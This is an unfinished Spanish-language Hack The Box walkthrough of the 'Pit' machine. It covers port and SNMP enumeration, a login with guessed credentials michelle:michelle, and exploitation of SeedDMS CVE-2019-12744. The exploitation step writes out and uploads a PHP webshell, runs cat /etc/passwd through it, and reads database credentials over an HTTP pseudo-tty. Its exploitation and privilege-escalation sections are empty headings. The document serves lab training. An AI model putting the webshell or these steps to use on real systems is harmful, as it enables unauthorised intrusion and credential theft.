
![[Pasted image 20241009162912.png]]


https://www.hackthebox.com/machines
---

| ![[Pasted image 20241007194520.png]]![[Pasted image 20241007194515.png]]**  OS** | ![[Pasted image 20241007195719.png]]**  Difficult** | **Tags** | **RELEASED**   | **Social Media**            |
| -------------------------------------------------------------------------------- | --------------------------------------------------- | -------- | -------------- | --------------------------- |
| **LINUX**                                                                        | **MEDIUM**                                          | #API     | **09/09/2023** | https://github.com/gorkaaaa |

Skills:

- Information Leakage
- SNMP Enumeration (Snmpwalk/Snmpbulkwalk)
- SeedDMS Exploitation

- SELinux (Extra)
- SNMP Code Execution

---

# Enumeración
*Esta fase va a consistir en hacer una enumeración general sobre la máquina para poder valorar vectores de intrusión y valorar posibles ataques.*

1. Comprobamos Conectividad.
```r
❯ ping -c 1 10.10.10.241
PING 10.10.10.241 (10.10.10.241) 56(84) bytes of data.
64 bytes from 10.10.10.241: icmp_seq=1 ttl=63 time=44.8 ms

--- 10.10.10.241 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 44.770/44.770/44.770/0.000 ms
```
*Vemos que tenemos conectividad con la máquina victima...*

2. Enumeración De Sistema Operativo con script.
```r
❯ whichSystem.py 10.10.10.241

	10.10.10.241 (ttl -> 63): Linux
```
*Podemos identificar que etamos ante un linux.*

3. Enumeración de Puertos con nmap.
```r
❯ nmap -p- --min-rate 5000 -Pn -n -sS -T5 10.10.10.241 -oG allPorts
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9090/tcp open  zeus-admin
```
*Podemos ver un par de puertos interesantes....*

```r
❯ extractPorts allPorts
───────┬─────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼─────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.241
   5   │     [*] Open ports: 22,80,9090
   6   │ 
   7   │ [*] Ports copied to clipboard
   8   │ 
───────┴────────────────────────────────────────────────
```
*Con la ayuda de esta utilidad extraemos los puertos y los copiamos en la clipboard*

```r
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 6f:c3:40:8f:69:50:69:5a:57:d7:9c:4e:7b:1b:94:96 (RSA)
|   256 c2:6f:f8:ab:a1:20:83:d1:60:ab:cf:63:2d:c8:65:b7 (ECDSA)
|_  256 6b:65:6c:a6:92:e5:cc:76:17:5a:2f:9a:e7:50:c3:50 (ED25519)
80/tcp   open  http            nginx 1.14.1
|_http-server-header: nginx/1.14.1
|_http-title: Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux
9090/tcp open  ssl/zeus-admin?
```
*Podemos ver un puerto 9090...*

4. Puerto 9090.
![[Pasted image 20241009164307.png]]
*Vemos que cuando entramos nos redirije y nos pone que es https y que tenemos que aceptar, esto ya nos da a entender que se está aplicando virtual hosting.*

![[Pasted image 20241009164358.png]]
*Aquí podemos ver varias cosas pero lo primero es que vemos un dominio que es pit.htb*

```r
❯ vi /etc/hosts
❯ cat /etc/hosts | grep "pit"
10.10.10.241 pit.htb
```
*Agregamos el dominio al archivo /etc/hosts...*

```r
❯ openssl s_client -connect 10.10.10.241:9090
depth=0 C = US, O = 4cd9329523184b0ea52ba0d20a1a6f92, CN = dms-pit.htb
```
*Podemos ver otro dominio...*

```r
❯ vi /etc/hosts
❯ cat /etc/hosts | grep "pit"
10.10.10.241 pit.htb dms-pit.htb
```
*Agregamos el otro dominio encontrado....*

5. Enumeración UDP
```r
❯ nmap -sU --top-ports 100 --open -n 10.10.10.241 -oG UDP
PORT    STATE SERVICE
161/udp open  snmp
```
*Podemos ver un puerto abierto y contiene el servicio de snmp que es un gestor de redes...*

6. Comunity String:
```r
❯ onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.10.10.241
10.10.10.241 [public] Linux pit.htb 4.18.0-305.10.2.el8_4.x86_64 #1 SMP Tue Jul 20 17:25:16 UTC 2021 x86_64
```
*Podemos ver que la comunity string es public y ahora vamos con snmpwalk*

7. SNMP
```r
❯ apt search mibs-downloader
snmp-mibs-downloader/parrot6 1.5 all
  install and manage Management Information Base (MIB) files
```
*Encontramos un paquete...*

```r
❯ apt install snmp-mibs-downloader
...
```
*Nos lo descargamos.*

```r
❯ vi /etc/snmp/snmp.conf

4   │ mibs :

-------------------

4   │ #mibs :
```
*Ahora vamos a cambiar este pequeño detalle del archivo...*

```r
❯ snmpwalk -v2c -c public  10.10.10.241 1

[*AQUI PODEMOS ENUMERAR DOS USUARIOS*]
Login Name           SELinux User         MLS/MCS Range        Service

__default__          unconfined_u         s0-s0:c0.c1023       *
michelle             user_u               s0                   *
root                 unconfined_u         s0-s0:c0.c1023       *

[*PODEMOS VER UN BINARIO QUE SE ESTÁ EJECUTANDO*]
NET-SNMP-EXTEND-MIB::nsExtendCommand."monitoring" = STRING: /usr/bin/monitor
```
*Podemos ver usuarios y un proceso que se está ejecutando...*

![[Pasted image 20241009172929.png]]
*Aquí podemos ver información respecto a RCE con snmp...*

```r
❯ snmpbulkwalk -v2c -c public  10.10.10.241 NET-SNMP-EXTEND-MIB::nsExtendObjects
NET-SNMP-EXTEND-MIB::nsExtendCommand."memory" = STRING: /usr/bin/free
NET-SNMP-EXTEND-MIB::nsExtendCommand."monitoring" = STRING: /usr/bin/monitor
```
*Ahora podemos seguir viendo ese proceso.*

```r
❯ snmpbulkwalk -v2c -c public  10.10.10.241 1
UCD-SNMP-MIB::dskPath.2 = STRING: /var/www/html/seeddms51x/seeddms
```
*Hemos podido ver una ruta...*

![[Pasted image 20241009173911.png]]
*Podemos ver que si aplicamos la ruta a una de las webs que tenemos podemos ver un panel de login...*

![[Pasted image 20241009174233.png]]
*Ahora probamos con las credenciales michelle:michelle*

![[Pasted image 20241009174319.png]]
*Ahora podemos ver que estamos dentro del panel...*

```r
❯ searchsploit seeddms
SeedDMS versions < 5.1.11 - Remote Command Execution |php/webapps/47022.txt
```
*Podemos ver este exploit que es interesante y vamos a tratar con el...*

```r
❯ searchsploit -m php/webapps/47022.txt
  Exploit: SeedDMS versions < 5.1.11 - Remote Command Execution
      URL: https://www.exploit-db.com/exploits/47022
     Path: /usr/share/exploitdb/exploits/php/webapps/47022.txt
    Codes: CVE-2019-12744
 Verified: False
File Type: ASCII text
Copied to: /home/user/HTB/Pit/scripts/snmpclitools/snmp-shell/47022.txt
```
*Nos llevamos el exploit...*

```r
  13   │ Step 1: Login to the application and under any folder add a document.
  14   │ Step 2: Choose the document as a simple php backdoor file or any backdoor/webshell could be used.
  15   │ 
  16   │ PHP Backdoor Code:
  17   │ <?php
  18   │ 
  19   │ if(isset($_REQUEST['cmd'])){
  20   │         echo "<pre>";
  21   │         $cmd = ($_REQUEST['cmd']);
  22   │         system($cmd);
  23   │         echo "</pre>";
  24   │         die;
  25   │ }
  26   │ 
  27   │ ?>
  28   │ 
  29   │ Step 3: Now after uploading the file check the document id corresponding to the document.
  30   │ Step 4: Now go to example.com/data/1048576/"document_id"/1.php?cmd=cat+/etc/passwd to get the command response in browser.
  31   │ 
  32   │ Note: Here "data" and "1048576" are default folders where the uploaded files are getting saved.
```
*Podemos ver esto...*

![[Pasted image 20241009174734.png]]
*Navegamos entre directorios hasta que veamos uno en el que tengamos la opción de subir nosotros un documento...*

![[Pasted image 20241009174802.png]]
*Tendriamos que ver un panel tal que así.*

```php
❯ cat 1.php
───────┬──────────────────────────────────
       │ File: 1.php
───────┼──────────────────────────────────
   1   │ <?php
   2   │ 
   3   │ if(isset($_REQUEST['cmd'])){
   4   │         echo "<pre>";
   5   │         $cmd = ($_REQUEST['cmd']);
   6   │         system($cmd);
   7   │         echo "</pre>";
   8   │         die;
   9   │ }
  10   │ 
  11   │ ?>
───────┴─────────────────────────────────────
```
*Ahora cogemos este archivo...*

![[Pasted image 20241009175305.png]]
*Agregamos el archivo para subir...*

![[Pasted image 20241009175503.png]]
*Lo hemos subido correctamente y haciendo hovering podemos ver abajo que nuestro archivo contiene el id=29*

![[Pasted image 20241009175723.png]]
*Ahora accediendo a la ruta: http://dms-pit.htb/seeddms51x/data/1048576/29/1.php?cmd=cat+/etc/passwd podemos ver lo siguiente*

```r
https://github.com/s4vitar/ttyoverhttp
```
*Vamos a coger este recurso de s4vitar que permite tener una tty...*

```r
❯ wget https://raw.githubusercontent.com/s4vitar/ttyoverhttp/refs/heads/master/tty_over_http.py

tty_over_http.py  100%[=======================>]   1.89K  --.-KB/s    in 0s
```
*Nos traemos el recurso...*

![[Pasted image 20241009181541.png]]
*Cambiamos los parametros de la url...*

```r
❯ rlwrap python3 tty_over_http.py
- pwd
/var/www/html/seeddms51x

- ls
conf
data
pear
seeddms
www

- cd conf
settings.xml
settings.xml.template
stopwords.txt

- settings.xml

```
*Podemos ver unas credenciales de base de datos...*
*Podemos ver unos cuantos directorios...*

```r
export PATH=/root/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/opt/nvim/bin:/opt/kitty/bin
```
*Le pasamos otra PATH*
# Explotación
*En esta fase vamos a ya tener un vector de ataque previamente enumerado y vamos a explotarlo.*



# Escalada de privilegios
*Esta fase va a consistir en pasar de ser un usuario no privilegiado a ser el administrador del sistema aprovechandonos de fallos en la seguridad internos del servidor.*

